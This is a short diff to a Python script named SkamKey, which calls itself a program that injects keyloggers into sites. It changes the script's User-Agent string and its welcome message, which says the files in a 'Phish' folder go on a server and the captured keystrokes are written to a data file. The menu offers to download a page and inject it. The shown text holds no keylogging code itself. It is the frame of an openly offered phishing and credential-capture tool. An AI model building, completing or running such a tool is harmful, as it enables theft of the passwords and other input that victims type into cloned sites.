@@ -1,6 +1,6 @@
 import os , sys , fileinput , subprocess
 ###You can change the User Agent here###
-UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
+UserA="""Mozilla/5.0 (Linux; U; Android 2.2; en-gb; Nexus One Build/FRF50) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"""
 S10 = '\033[91m'#yellow
 S11 = '\033[94m'#clearblue
 S12 = '\033[93m'#pink
@@ -59,7 +59,7 @@ def main1():
         main1()
 def main():
     clear()
-    print('Welcome to SkamKey,\nMade by Out-Shit https://out-shit.github.io/SkamKey\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server.\nAll the Keylogs will be in the data.txt')
+    print('Welcome to SkamKey,\nMade by Out-Shit https://out-shit.github.io/SkamKey\n\nThis is a program who install KeyLogger in sites\nAll files in "Phish" folder have to be host on a server (even the .htaccess). All the Keylogs will be in the data.html')
     input()
     clear()
     print("""\n\n\n\n\nChoose option\n#1-Download page\n#2-Inject the page\n""")
